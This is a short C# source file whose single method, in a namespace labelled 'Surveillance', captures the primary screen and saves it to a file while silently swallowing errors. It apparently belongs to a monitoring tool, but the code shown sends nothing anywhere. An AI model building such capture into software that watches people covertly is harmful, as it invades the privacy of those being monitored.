using System;
using System.Drawing;
using System.Windows.Forms;

namespace Kernel.Functions.Surveillance {
    class Shield {
        public static void ScreenShot(string SaveFile) {
            try {
                using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)) {
                    using (var g = Graphics.FromImage(bmp)) {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        bmp.Save(SaveFile);
                    }
                }
            } catch (Exception) { }
        }
    }
}
